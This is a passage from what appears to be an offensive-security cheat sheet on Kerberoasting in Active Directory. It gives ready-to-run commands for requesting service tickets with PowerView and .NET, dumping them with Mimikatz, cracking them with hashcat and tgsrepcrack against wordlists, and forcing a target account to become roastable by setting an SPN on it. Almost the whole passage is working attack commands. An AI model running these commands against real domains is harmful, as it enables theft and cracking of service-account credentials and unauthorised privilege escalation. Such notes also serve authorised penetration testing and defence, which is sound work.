#### Automatic

With PowerView:

```powershell
Get-DomainSPNTicket -SPN "MSSQLSvc/sqlserver.targetdomain.com"
```

Crack the hash with Hashcat:

```bash
hashcat -a 0 -m 13100 hash.txt `pwd`/rockyou.txt --rules-file `pwd`/hashcat/rules/best64.rule
```
#### Manual

```powershell
# Request TGS for kerberoastable account (SPN)
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/sqlserver.targetdomain.com"

# Dump TGS to disk
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Crack with TGSRepCrack
python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\mssqlsvc.kirbi
```

#### Targeted kerberoasting by setting SPN

We need have ACL write permissions to set UserAccountControl flags for the target user, see above for identification of interesting ACLs. Using PowerView:

```powershell
Set-DomainObject -Identity TargetUser -Set @{serviceprincipalname='any/thing'}
```